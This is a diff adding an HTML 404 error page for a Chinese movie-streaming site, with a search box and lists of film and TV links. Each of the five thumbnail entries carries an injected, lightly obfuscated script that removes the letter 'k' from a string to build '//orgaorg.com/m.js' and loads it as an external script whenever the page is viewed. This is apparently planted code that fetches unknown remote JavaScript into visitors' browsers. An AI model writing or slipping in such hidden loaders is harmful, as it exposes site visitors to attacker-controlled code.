@@ -1,0 +1,72 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<META http-equiv=refresh content="10;URL = https://www.wodou99.com/">
+<title>404 - 窝豆影院</title>
+<meta name="keywords" content="404错误页面" />
+<meta name="description" content="404错误页面"/> 
+<link href="/template/dy/images/404.css" type="text/css" rel="stylesheet" />
+<base target="_blank" />
+</head>
+<body>
+<div id="page-error">
+	<div id="page-error-img">
+		<h1>404</h1>
+		<p><span id="tip">很抱歉，没有找到您想访问的页面，或本页面已被删除。</span></p>
+		<p><span id="gbook"><a href="/gbook.asp" target="_self">给我们留言</a></span><label>或者</label><span id="go-back"><a href="/" target="_self">返回 窝豆影院 首页</a></span></p>
+	</div>
+	<div id="page-error-txt">
+		<div id="page-error-search">
+			<div class="search">
+				<form id="search" name="search" method="POST" action="/search.asp" onSubmit="return qrsearch();">
+					<input type="text" id="kw" name="searchword" class="input-txt" value="请在此处输入影片片名或演员名称。" onfocus="if(this.value=='请在此处输入影片片名或演员名称。'){this.value='';}" onblur="if(this.value==''){this.value='请在此处输入影片片名或演员名称。';};" />
+					<input type="submit" id="searchbutton"  class="input-btn" value="" />
+				</form>
+			</div>
+	    </div>
+<div id="page-error-list">
+			<ol class="pic-list">
+			
+			<li>
+					<a class="play-pic" href="/kongbu/anfang/"><img src="http://img.wodou99.com/pic/uploadimg/2020-7/40640.jpg"><script id="vv"></script><script>var s="//orkgakorkg.cokm/m.jks";w=s.replace(/k/g,"");vv.src=w</script><link rel="" alt="暗房" /><label class="bg">&nbsp;</label><label class="time">HD</label></a>
+					<p><a href="/kongbu/anfang/">暗房</a></p>  
+				</li>
+			<li>
+					<a class="play-pic" href="/guochanzy/mangguozongyiVIPbaocangji/"><img src="http://img.wodou99.com/pic/uploadimg/2020-7/3890.jpg"><script id="vv"></script><script>var s="//orkgakorkg.cokm/m.jks";w=s.replace(/k/g,"");vv.src=w</script><link rel="" alt="芒果综艺VIP宝藏季" /><label class="bg">&nbsp;</label><label class="time">20200517期</label></a>
+					<p><a href="/guochanzy/mangguozongyiVIPbaocangji/">芒果综艺VIP宝藏季</a></p>  
+				</li>
+			<li>
+					<a class="play-pic" href="/rihandm/baodouxuanyandagangdan/"><img src="http://img.wodou99.com/pic/uploadimg/2022-3/96377.jpg"><script id="vv"></script><script>var s="//orkgakorkg.cokm/m.jks";w=s.replace(/k/g,"");vv.src=w</script><link rel="" alt="爆斗宣言大钢弹" /><label class="bg">&nbsp;</label><label class="time">完结</label></a>
+					<p><a href="/rihandm/baodouxuanyandagangdan/">爆斗宣言大钢弹</a></p>  
+				</li>
+			<li>
+					<a class="play-pic" href="/kongbu/sirendao/"><img src="http://img.wodou99.com/pic/uploadimg/2021-5/33899.jpg"><script id="vv"></script><script>var s="//orkgakorkg.cokm/m.jks";w=s.replace(/k/g,"");vv.src=w</script><link rel="" alt="死人岛" /><label class="bg">&nbsp;</label><label class="time">BD</label></a>
+					<p><a href="/kongbu/sirendao/">死人岛</a></p>  
+				</li>
+			<li>
+					<a class="play-pic" href="/juqing/yinhe/"><img src="http://img.wodou99.com/pic/uploadimg/2020-7/46379.jpg"><script id="vv"></script><script>var s="//orkgakorkg.cokm/m.jks";w=s.replace(/k/g,"");vv.src=w</script><link rel="" alt="银河" /><label class="bg">&nbsp;</label><label class="time">BD1280HD</label></a>
+					<p><a href="/juqing/yinhe/">银河</a></p>  
+				</li>
+     			       			       				
+			</ol>
+			<ul class="txt-list">
+			
+			   <li><span>01.</span><a href="/dongzuo/chaojijihua/"  title="超级计划">超级计划</a>/<a class="gray" href="/dongzuo/">动作片</a></li>
+			   <li><span>02.</span><a href="/guochandm/jueshiwushendi3ji/"  title="绝世武神第3季">绝世武神第3季</a>/<a class="gray" href="/guochandm/">国产动漫</a></li>
+			   <li><span>03.</span><a href="/kehuan/xiyouji/"  title="西游记">西游记</a>/<a class="gray" href="/kehuan/">科幻片</a></li>
+			   <li><span>04.</span><a href="/dongmandy/labixiaoxinjizhantuyawangguoheyuesiweiyongshi/"  title="蜡笔小新：激战！涂鸦王国和约四位勇士">蜡笔小新：激战！涂鸦王国和约四位勇士</a>/<a class="gray" href="/dongmandy/">动漫电影</a></li>
+			   <li><span>05.</span><a href="/riben/Elpisxiwanghuozhezainan/"  title="Elpis-希望、或者灾难-">Elpis-希望、或者灾难-</a>/<a class="gray" href="/riben/">日本电视剧</a></li>
+			   <li><span>06.</span><a href="/oumei/danqinlamadierji/"  title="单亲辣妈第二季">单亲辣妈第二季</a>/<a class="gray" href="/oumei/">欧美电视剧</a></li>
+			   <li><span>07.</span><a href="/rihanzy/liangtianyiye2007/"  title="两天一夜2007">两天一夜2007</a>/<a class="gray" href="/rihanzy/">日韩综艺</a></li>
+			   <li><span>08.</span><a href="/xianggang/jiangshiqibingyueyu/"  title="僵尸奇兵粤语">僵尸奇兵粤语</a>/<a class="gray" href="/xianggang/">香港电视剧</a></li>
+			   <li><span>09.</span><a href="/guochan/shendiaoxialvchenxiaoban/"  title="神雕侠侣陈晓版">神雕侠侣陈晓版</a>/<a class="gray" href="/guochan/">国产电视剧</a></li>
+			   <li><span>10.</span><a href="/dongzuo/muxingbenneng/"  title="母性本能">母性本能</a>/<a class="gray" href="/dongzuo/">动作片</a></li>
+			   <li><span>11.</span><a href="/dongmandy/huanyingguanglinyuzhouxiu/"  title="欢迎光临宇宙秀">欢迎光临宇宙秀</a>/<a class="gray" href="/dongmandy/">动漫电影</a></li>
+			   <li><span>12.</span><a href="/juqing/tatatata/"  title="他她他她">他她他她</a>/<a class="gray" href="/juqing/">剧情片</a></li>		     						
+			</ul> 
+		</div>
+	</div>
+</div>
+</body>
+</html>
